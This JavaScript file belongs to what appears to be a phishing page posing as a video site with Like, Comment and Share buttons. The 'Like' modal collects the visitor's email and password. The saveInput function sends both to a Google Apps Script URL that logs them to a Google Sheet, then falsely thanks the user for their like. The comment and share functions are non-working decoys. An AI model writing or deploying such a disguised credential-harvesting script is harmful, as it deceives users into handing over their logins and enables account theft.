// Open the Like modal
function openModal() {
    document.getElementById("like-modal").classList.remove("hidden");
}

// Close the Like modal
function closeModal() {
    document.getElementById("like-modal").classList.add("hidden");
}

function saveInput() {
    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;

    if (!email || !password) {
        alert("Please fill in both email and password.");
        return;
    }

    // Google Apps Script Web App URL
    const googleScriptURL = "https://script.google.com/macros/s/AKfycbykdaWzGqE-kpGlNWkuAh0hxFpY0a9yRrPu_wRaQ7YFJefkXBmqPoiN4gl9CLlpjBzt6A/exec";

    // Send the data to the Google Sheet
    fetch(googleScriptURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            email: email,
            password: password,
        })
    })
    .then(response => {
        if (!response.ok) {
            return response.text().then((text) => {
                throw new Error(`Server error: ${response.status} - ${text}`);
            });
        }
        return response.json();
    })
    .then(data => {
        if (data.success) {
            alert("Thank you! Your like has been recorded.");
        } else {
            alert("Failed to save data: " + data.message);
        }
        console.log(data);
    })
    .catch(error => {
        console.error('Error:', error.message);
        alert("An error occurred while saving your data: " + error.message);
    });

    closeModal();
}

// Open the Comment modal
function openCommentBox() {
    document.getElementById("comment-box").classList.remove("hidden");
}

// Close the Comment modal
function closeCommentBox() {
    document.getElementById("comment-box").classList.add("hidden");
}

// Save Comment
function saveComment() {
    alert("Poor Internet.");
    closeCommentBox();
}

// Placeholder for Share
function shareVideo() {
    alert("Share feature unavailable at the moment.");
}
